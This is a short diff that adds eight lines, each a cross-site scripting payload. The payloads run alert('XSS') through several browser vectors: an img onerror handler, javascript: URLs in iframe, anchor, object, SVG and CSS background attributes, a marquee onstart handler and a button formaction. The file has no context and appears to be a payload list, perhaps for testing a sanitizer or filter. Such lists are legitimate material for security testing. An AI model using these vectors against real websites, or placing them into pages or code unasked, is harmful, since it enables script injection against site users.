@@ -1,0 +1,8 @@
+<img src="x" onerror="alert('XSS');">
+<iframe src="javascript:alert('XSS');"></iframe>
+<marquee onstart="alert('XSS')">XSS</marquee>
+<div style="background-image: url(javascript:alert('XSS'))"></div>
+<a href="javascript:alert('XSS')">Click Me</a>
+<object data="javascript:alert('XSS')"></object>
+<svg><a xlink:href="javascript:alert('XSS')">XSS</a></svg>
+<form><button formaction="javascript:alert('XSS')">Click</button></form>
